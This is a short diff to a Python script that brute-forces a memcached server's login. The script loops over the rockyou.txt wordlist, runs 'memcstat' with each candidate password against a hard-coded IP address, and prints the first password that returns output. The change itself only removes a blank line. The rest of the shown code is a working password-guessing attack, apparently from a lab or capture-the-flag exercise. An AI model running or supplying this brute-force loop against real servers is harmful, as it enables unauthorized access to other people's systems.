@@ -12,7 +12,6 @@ w = open('/usr/share/wordlists/rockyou.txt')
 for p in w:
         o = s.getoutput("memcstat --username=user --servers=192.160.226.3 --password="+p) #Change: IP, Username
         if len(o) > 0:
-                #print(o) #Enable if you want to see the output of the command
-				
+                #print(o) #Enable if you want to see the output of the command		
                 print('Password is:' + p)
                 break
